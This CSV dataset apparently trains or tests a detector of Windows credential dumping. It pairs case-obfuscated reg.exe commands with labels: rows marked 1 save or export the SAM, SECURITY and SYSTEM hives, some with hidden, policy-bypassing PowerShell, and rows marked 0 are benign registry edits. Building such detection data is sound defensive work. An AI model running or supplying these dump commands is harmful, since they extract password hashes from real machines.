text,label
pOwersHell -coMMAnd REG  exPoRt  HkLM\sAm  c:\uSErS\pubLIc\rEGistRY_exPort.reG,1
"Reg ADD ""hKu\sYsTEm\CurrEntcOntrOlSEt\seRVIceS\sUBKey16"" /V Version /t reG_SZ",0
PwsH -nopROFiLe -C reG  SAVe HkLM\seCurItY   c:\wInDOWS\TEmP\SAM.sAvE,1
"reg.exe  unload  ""hkey_users\hkey_local_machine\software\policies\microsoft""  /v version",0
"start /b reg.exe   add   ""hkey_local_machine\environment\subkey73""   /f   /t reg_dword   /d ""c:\program files\app""",0
"POWeRShEll -C REg.eXe  comPaRE  ""hku\HKEY_local_mAChinE\sofTWArE\POliCieS\miCROsoft\sUBkeY61""  ""hKu\SOfTwaRe\pOLICiES\MyCorp_148""",0
REg.eXE Save HkLM\SeCURITy   %TeMP%\Sec_BackUP.dAt,1
reg   save   hklm\system c:\temp\system.hive /y,1
cmd.exe /c reg.exe  save hklm\system  c:\windows\temp\sam.save /y,1
pwsh -noprofile -c reg.exe   export  hkey_local_machine\sam \\localhost\c$\__dump\sam.bak /y,1
"ReG.eXe  SAve  ""HKcU\SOFTwARE\MICroSOfT\winDoWS\currENtVeRsIon""  ""c:\UserS\pubLic\ChrOME_dATA.BAk""  /y",0
"reg AdD ""hkey_cURrEnt_USEr\eNvIroNmENT\Subkey97"" /f  /D 1",0
CMd.ExE /c stArT /B reG.EXe SAvE   HKlM\SEcuritY \\locaLHOST\c$\__DUmp\SaM.bak,1
"reg.eXE   uNlOAd   ""HKEy_LOcAL_MaCHiNE\SOftWARe\GoOGLe\CHRome\SubKEy26""   /v laStupdAte",0
C:\wINDowS\SYSTeM32\cmD.exE /k reg.eXE ExpoRt  HKEY_lOcal_macHINE\sEcUrITY  %TeMp%\sEC_BaCKuP.DAT,1
"reg   QUeRY   ""hKCu\sYSTeM\cURREntCOntrOLSeT\sERVICeS\SUBkeY72""   /f",0
powershell -exec bypass -w hidden -c reg.exe   export  hkey_local_machine\system  c:\users\public\registry_export.reg,1
cMd.ExE /C Reg.EXE  eXpOrt hkLm\SecuRiTy   \.\c$ACkUp.reG,1
"CmD /c rEg SAVe ""hKEY_LOCAL_macHINE\hkEy_loCAL_MAchIne\SOFTwAre\woW6432noDe"" ""c:\temP\USer_setTINgs.rEG"" /y",0
cMD.exe /c sTaRT /B rEG   exPOrt hKEy_LOCAl_mAChIne\sEcURItY   \.\c$ACkuP.rEg,1
"reg.eXE  cOpY  ""hkcu\Hkey_LoCal_machine\SYsTeM\CUrREntContRolSEt\cONtROL""  ""HKcU\SoFtware\poLicIes\MYCoRp_546""",0
"cMd /C POwershElL -c ""REG ExPoRT  HKey_LocAL_MACHIne\SEcUrITy  c:\WIndOwS\Temp\sAm.sAVE  /Y""",1
"rEg.EXE aDd ""HKcU\SOfTwARE\clAsSeS\SuBkey13"" /v VErSioN /T REg_dwOrD /D 1",0
"sTARt /B reg  SAVE  ""HKey_LocAL_MAcHine\HkeY_loCal_macHine\sOfTWARe\Wow6432NODe\SUBKEy15""  ""c:\TEMp\uSer_SETtInGs.REG""",0
PowerShEll -EXEC BYPaSs -W hidDen -C rEg  exPort   HKlM\SYsTEm C:\UseRs\puBLiC\regIstRy_EXpoRt.REg /y,1
pwsh -noprofile -c reg.exe save hklm\security %temp%\sec_backup.dat,1
"reg.eXE  deLETe  ""hKu\cONTrOl PAnEl\DeSkTOP""",0
"Cmd /C REG  CopY  ""hKEY_loCAL_maChIne\SoftwARE\mICROsoft\WIndoWs\currenTvErsioN\sUbKey16""  ""hKEy_LOcaL_mAChINE\HKeY_LOcAl_mAcHiNe\sOFtWARe\POlICies\micRosoFT_381""",0
C:\wInDows\SysTEm32\CMd.Exe /K reG.exe  SaVE   HKey_lOCAL_mAcHINe\sECuRITy  c:\uSErs\PUBLic\reGiSTry_ExPort.REG  /Y,1
C:\wINdoWs\sYSTem32\cmD.eXe /k ReG  eXporT Hkey_LocaL_MAChiNE\SECURity   C:\TeMp\SystEm.Hive,1
"reg.exe   delete   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey58""   /v version",0
pOwershell -cOmmAnd reg  SavE hkeY_lOCAl_mACHiNE\sYSTEm  c:\tEMp\sySTem.HIve,1
c:\windows\system32\cmd.exe /k reg.exe save   hklm\sam  c:\users\public\registry_export.reg,1
powershell -command reg.exe  save   hklm\security   %temp%\sec_backup.dat,1
pwsH -NoPRofiLE -C reg.EXe exPorT  hkey_LoCal_MAChINE\SAm  c:\TeMP\sYSTeM.hivE   /Y,1
"rEg.exe COMpare ""hKey_LOCal_machiNe\SoftwAre\miCRosoft\wiNdOws\CUrrEntVeRsioN\sUbKey44"" ""hkEY_locaL_macHiNe\eNVIronMeNt_619""",0
"reg.exe   copy   ""hkey_current_user\system\currentcontrolset\services""   ""hkey_current_user\software\policies\mycorp_807""",0
"sTaRt /B REG  Add  ""hKey_LocAL_maChIne\soFTWare\MIcrOSoFT\WindowS\cuRRentvErSIon""  /f  /t ReG_sz  /d ""1.0.0""",0
"CmD /C POWeRSHeLl -c ""rEg.exe  SAvE HKLm\Sam \.\c$aCKUP.reG   /Y""",1
pWsh -NoProFILE -C reg.eXE sAVe HKlm\saM  C:\WIndowS\TEmp\SAM.SAVe   /y,1
cmd.exe /c reg.exe export hklm\sam  \\localhost\c$\__dump\sam.bak  /y,1
"cmd /c reg.exe   delete   ""hkcu\environment""   /v path",0
"rEg rEStorE ""HKey_LoCAl_MaChInE\Hkey_LoCaL_mAChinE\SOFTwARe\PolICies\miCRoSofT\sUBKEy39"" ""hkey_LoCal_mACHINe\SOFTwaRe\pOLiCies\mYCoRP_841""",0
"reg.exe unload ""hkcu\software\policies\mycorp\subkey56"" /v path",0
"pOwERsheLl -c ReG  unloaD  ""hkU\SoFTwARe\gOogle\ChroME\SuBKeY21""  /v lAstuPDaTE",0
"rEg.eXE CoMpARe ""HKU\HkeY_loCal_MaChinE\soFtWare\Wow6432nODE"" ""hku\softwArE\pOlicies\mYCORP_585""",0
cMD.ExE /c REG.ExE eXpORt  HkEy_Local_MaCHiNE\SEcuRitY c:\tEmP\sYsTEm.hivE,1
"reg compare ""hkey_users\software\policies\mycorp\subkey63"" ""hkey_users\software\classes_748""",0
"reg   delete   ""hkey_users\hkey_local_machine\software\policies\microsoft\subkey80""   /f",0
pwsh -noprofile -c reg.exe   save hklm\system   \\localhost\c$\__dump\sam.bak  /y,1
"reg.exe  copy  ""hkey_local_machine\software\classes\subkey29""  ""hkey_local_machine\control panel\desktop_440""",0
powersHEll -COMmaNd rEG  SAve hKey_locAl_MAChInE\sAm  \\LOCALhoSt\c$\__duMp\sAM.BAk,1
cmd.eXe /C reG.eXe  SAVe   hKeY_LOcAl_mAcHIne\Sam   c:\TEmp\sYSTEm.hIVE  /Y,1
PoWERsHEll -ExeC bYPAsS -w HIdDEN -C REG.ExE  EXPOrT  HKey_lOCAL_macHine\saM   c:\USErs\pUBLiC\REGIStry_ExPoRt.rEg /Y,1
c:\windows\system32\cmd.exe /k reg.exe  save hkey_local_machine\sam  \.\c$ackup.reg,1
"POwersHELl -C rEG COPy ""hKey_CuRREnT_user\Hkey_LOcaL_mAchine\sysTem\CURREnTCOntrolseT\CONTroL"" ""HkeY_curreNt_usEr\HkeY_LoCal_mAcHine\sofTwaRe\WoW6432NOde_515""",0
"stArt /B Reg.exE   uNload   ""HKEy_Local_mAchinE\sySTEM\CURREnTCOntrolSeT\servicES""   /V paTh",0
powershell -command reg export   hklm\security  c:\users\public\registry_export.reg,1
CMd.EXe /c STarT /b ReG  ExpOrt   HkLm\SECurItY   c:\UseRS\PuBliC\REGIstRy_EXPOrT.Reg,1
c:\windows\system32\cmd.exe /k reg.exe   save  hkey_local_machine\system   c:\temp\system.hive /y,1
CMD.exe /C ReG.ExE   SAVe hkLM\SEcuriTY  c:\useRS\pUblIc\reGistrY_eXpORT.rEG  /Y,1
c:\windows\system32\cmd.exe /k reg export  hklm\sam  %temp%\sec_backup.dat,1
pOwershELl -EXEc bypasS -w HidDEn -C reG.EXe   eXPOrT  hkEY_lOCAL_mAcHiNE\SecUrItY   c:\USERs\PubLic\ReGIStrY_eXPOrT.REg /Y,1
c:\WINDowS\SysTEm32\cMd.EXe /K reG.exE   expoRT HKlM\sYstEm   \\LocALHost\c$\__DuMp\SaM.BAk,1
"cmd /c reg   add   ""hku\software\microsoft\windows\currentversion""   /v lastupdate   /t reg_sz",0
reg.exe  save hklm\sam   %temp%\sec_backup.dat,1
reG.Exe   sAvE   hklm\SAM \.\c$ACkUp.ReG /Y,1
"ReG.EXE  SAve  ""HKEY_LOCaL_Machine\HkEy_locaL_MachINe\SOfTwArE\WOW6432nODE""  ""C:\UserS\pubLic\cHrOme_dAtA.bak""",0
"reg.exe query ""hkey_current_user\software\microsoft\windows\currentversion"" /f",0
Pwsh -NOPROFile -c reg.exE  eXpoRt  hklM\Sam  \\LOcaLHOSt\c$\__DuMp\sAm.bAK,1
cMd.exE /c StaRt /b REg save  Hklm\sysTeM  c:\TemP\sYsTEm.HIvE,1
"reg.ExE   saVE   ""HkCu\CoNTROl PanEL\DESKtOP\sUBkeY99""   ""D:\baCkUp\regIStry_hIvE.DAt""",0
cmd.eXe /c ReG   save  Hklm\SystEm  \\LOCalhoSt\C$\__DUMP\sam.bak,1
c:\wiNdoWs\syStem32\cMd.exe /k reG.exe sAve  hkEy_loCAl_mAChiNe\SeCurITY  %tEMp%\sec_BackUP.Dat,1
"CmD /C PoWerSheLl -c ""reG.eXe EXPOrt  hklM\SySTEm \.\C$AckUP.reG  /Y""",1
"cmd /c powershell -c ""reg   save hkey_local_machine\sam  c:\temp\system.hive""",1
PWSh -NoprofiLe -C rEG SavE  hkEY_loCal_maChIne\sECurIty   \.\C$aCKup.rEG /Y,1
"reg.eXe  UNloAD  ""HkEY_LOCAL_mAChinE\CoNtrOL PANel\dESktoP\suBkey25""",0
"REG.EXE   dELetE   ""hKEy_LOCal_MachIne\COnTrOL pAnEL\dESKtop""   /v paTh",0
"rEG.Exe  SaVE  ""HKeY_LoCaL_mAChinE\hkeY_lOCal_MacHInE\SYSTEm\cUrREntcontROLSEt\COnTrOL""  ""c:\wIndOws\tEMp\softWArE_dUmp.dAT""",0
pOweRshEll -cOmmaND rEg   ExPOrt HkEY_LocaL_machinE\sam   C:\teMP\SysTEm.hIVe /y,1
"reg.exe query ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey57"" /v path",0
"rEg   quErY   ""hKEY_CUrreNt_UsEr\hkeY_LoCAL_maChiNE\sOftwARE\pOlICIeS\MICrOsOFT""   /F",0
"REg   CoMPARE   ""hkey_LOCAL_MachiNE\HKey_LocaL_MachiNe\sYSteM\CurREntcOnTrolSet\cOntRol\SuBkeY90""   ""HkeY_LocAL_MAcHInE\HkEy_locaL_machINe\systeM\CurREnTConTrOLset\conTrOL_292""",0
POwersHeLl -exec BypaSs -w hIDDEN -c rEG EXpoRt hkLm\SYStEM c:\uSeRs\PuBlIc\registrY_Export.reg,1
"rEG coMPaRE ""HKEY_CuRRenT_USEr\softwARe\ClasSeS"" ""hkeY_CURREnT_usEr\HKeY_locAl_MaChiNe\SyStem\CuRrEnTconTrolSEt\cOntRoL_592""",0
"reg unload ""hkey_users\software\google\chrome\subkey10""",0
poWeRShell -exeC bYPAsS -w HiDden -C rEG.EXe   saVE   hklm\sAM   c:\USErS\puBLIC\ReGisTrY_EXPoRt.rEG   /y,1
"CMD /C REg.eXE   qUErY   ""hKU\SoFTWARe\POLiCIEs\mYcOrp""   /F",0
"rEg.exE dELETE ""Hkey_uSers\SOfTWARE\poLiCies\myCORp\sUbKEY24"" /v PAth",0
cmD.exE /C rEG EXPort  hKey_lOcal_mAChINE\seCUrIty   C:\WINDowS\temp\SAm.saVE,1
"Reg   REstoRE   ""Hkey_CuRrent_USer\hkEy_locAl_MaChinE\SOFTWare\policiES\miCroSOFt""   ""hKEY_CurrENt_usER\hKeY_lOcAl_mAcHIne\SOftWARe\PolICies\miCrOSoft_960""",0
PowERSheLl -ExEc Bypass -W HIdDEn -c Reg   ExpORt HKlM\saM C:\Users\PUbLIc\ReGIsTry_ExpOrT.rEG,1
powershell -command reg.exe  export   hkey_local_machine\security  c:\windows\temp\sam.save /y,1
powershell -command reg.exe save  hklm\system   c:\windows\temp\sam.save   /y,1
"cmd /c powershell -c ""reg save   hklm\system \.\c$ackup.reg /y""",1
"Reg.ExE quERY ""HKeY_UseRs\Hkey_LoCAL_macHInE\SofTWARe\wow6432nodE"" /v vErSiON",0
"rEG  COpY  ""HkeY_loCal_MAcHine\sOfTwAre\policiES\MyCORP""  ""HkEY_LocaL_MaCHiNE\SOftWaRE\mICrOSoFT\windOws\CuRReNtvErSioN_818""",0
POWERShELl -COmMANd Reg.eXe   SAVE   hKEy_LocAL_MacHinE\SAm  \.\c$AckUP.reG  /Y,1
"Reg cOmpaRE ""hKcU\enVIRonMent\suBkey28"" ""hKCU\eNviRoNmEnT_338""",0
C:\WIndoWs\SYstem32\cMD.ExE /K REG.ExE  sAVe HKlM\seCURiTY c:\UsErs\PUbLIC\REGiStRY_expORt.ReG,1
reg.exe   save  hkey_local_machine\security c:\windows\temp\sam.save /y,1
"CMd /C powERsHell -c ""reG.eXe eXPoRT   hkLM\SEcUrITY   \\LOcALhosT\C$\__dUmp\Sam.BAK /y""",1
"start /b reg.exe   restore   ""hkcu\software\policies\mycorp\subkey83""   ""hkcu\software\classes_323""",0
pwSH -nOProFiLe -C REg.exE  exPORt Hklm\syStem  %TEmp%\SEc_bAcKUP.dat,1
"CMD /c POWeRsHelL -C ""reg   savE hkEY_loCAl_macHine\sAm  c:\wiNDowS\tEmp\sAM.SAvE  /y""",1
